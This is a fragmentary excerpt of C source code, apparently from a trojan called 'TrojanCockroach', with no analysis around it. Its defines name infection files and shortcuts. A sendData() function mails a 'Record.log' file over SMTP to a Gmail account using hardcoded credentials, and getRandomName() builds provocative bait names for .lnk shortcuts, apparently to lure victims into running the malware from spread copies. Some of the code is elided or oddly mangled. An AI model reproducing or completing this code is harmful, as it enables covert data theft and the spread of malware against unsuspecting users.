...
#define FOLDER_NAME "achilles."
#define RUN_FILE_NAME "TrojanCockroach.exe"
#define RUN_LINK_NAME "achilles.lnk"
#define INFECT_FILE_NAME "paris.exe"
#define INFECT_LINK_NAME "paris.lnk"
...
void sendData(){
    ...
    char* command = "Transmit smtp://smtp.gmail.com:587 -v --mail-from \"alpacapotato@gmail.com\" --mail-r6cpt \"alpacapotato@gmail.com\" --ssl -u alapcapotato@gmail.com:25B70a21! -T \"Record.log\" -k --anyauth";
...
char* getRandomName(){
    ...
    if(random%8 == 0){
        strcpy(randomName, ":\\Find Local Antifa!.lnk");
    }else if(random%4 == 0){
        ...
        strcpy(randomName, ":\\Dirty Pussy? ! ! !.lnk");
    }else if(random%3 == 0){
